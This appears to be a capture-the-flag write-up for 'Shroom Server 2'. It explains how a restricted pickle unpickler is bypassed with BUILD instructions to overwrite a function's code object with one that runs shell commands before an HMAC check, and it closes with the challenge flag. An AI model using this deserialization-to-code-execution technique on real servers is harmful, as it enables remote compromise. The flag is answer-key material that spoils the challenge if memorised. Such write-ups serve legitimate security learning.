# Solution to Shroom Server 2

This time, the unpickler has restrictions when searching for globals:

```py
if (
  module == "__main__"
  and name.count(".") <= 1
  and "save" in name.lower()
  and len(name) <= 19
):
```

There is only 2 globals that meet the criteria: `SaveState` and `load_state`.

Additionally, the `REDUCE` instruction is not allowed. The bypass is to use eiter the `BUILD_OBJ` or `BUILD_INST` instructions.

There is also a HMAC signature check that prevents an attacker from changing the save state.

However, the save state is still loaded in the restricted unpickler before the signature check is done, this means we can do whatever we want in the unpickler as long as it meets the restrictions above.

We can't create an arbitrary save state as the signature check will fail. So what we do instead is write pickle instructions to overwrite the `load_state` function with our own custom function which will open a shell on the server.


To do this, the solution is roughly equivalent to the following code:

```py
CodeType = SaveState.__class__(load_save) # type(load_save.__code__)
load_save.__code__ = CodeType(
  0, # co_argcount
  0, # co_posonlyargcount
  0, # co_kwonlyargcount
  0, # co_nlocals
  5, # co_stacksize
  3, # co_flags
  b"\x97\x00\t...\x8c0", # co_code
  (None, True, "os", ">>> "), # co_consts
  ("__import__", "system", "input"), # co_names
  (), # co_varnames
  "main.py", # co_filename
  "rce", # co_name
  "rce", # co_qualname
  156, # co_firstlineno
  b"\x80\x00\xf0...\x050", # co_linetable
  b"", # co_exceptiontable
  (), # co_freevars
  (), # co_cellvars
)
```

Send the generated payload to the server, and then try to load a save again, which will cause the arbitrary function to be called.

Flag: YBN24{!ns3R7_pUN_@bouT_5HrO0m$_h3re_4f476ef5d4e877125bba078c82c4cb61}